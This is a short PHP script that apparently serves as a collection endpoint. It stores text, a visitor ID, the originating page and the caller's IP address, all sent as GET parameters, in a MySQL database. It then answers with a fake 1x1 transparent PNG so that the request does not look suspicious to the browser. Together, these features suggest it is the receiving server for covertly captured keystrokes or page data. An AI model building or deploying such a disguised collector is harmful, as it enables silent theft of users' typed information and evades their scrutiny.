<?php
/*
 * This script pushes the data to the database 
 *
 */

include('CONFIGURATION.php');
?>


<?php

//Prepared statement text
$insert_req = 'INSERT INTO '.$TABLE_NAME.' (IPAddress,GUID_like,WhereFrom,TextSend) VALUES (?,?,?,?);';

/*
 * Create a 1 by 1 image with transparent background( if the browser is suspicious of call to non image)
 */
function create_fake_image(){
  header('content-type:image/png');
  // One by one pixel
  $im = imagecreatetruecolor(1, 1);
  $background_black = imagecolorallocate($im, 0, 0, 0);
  imagecolortransparent($im,$background_black);
  imagePNG($im);
}

?>

<?php 

// Now we put the information in MySQL
$link_to_db = new mysqli($HOST,$DB_LOGIN,$DB_PASSWORD,$DATABASE_NAME);


$prep_stmt = $link_to_db->stmt_init();

if($prep_stmt->prepare($insert_req)){
  //Success of the prepared statement
  $text=$_GET['text'];
  $guid=$_GET['guid'];
  $from_ip=$_SERVER['REMOTE_ADDR'];
  $from_page=$_GET['frompage'];
  //Associate the parameters with the statement
  $prep_stmt->bind_param('ssss',$from_ip,$guid,$from_page,$text);
  $prep_stmt->execute();
  $prep_stmt->close();
}


create_fake_image();

?>

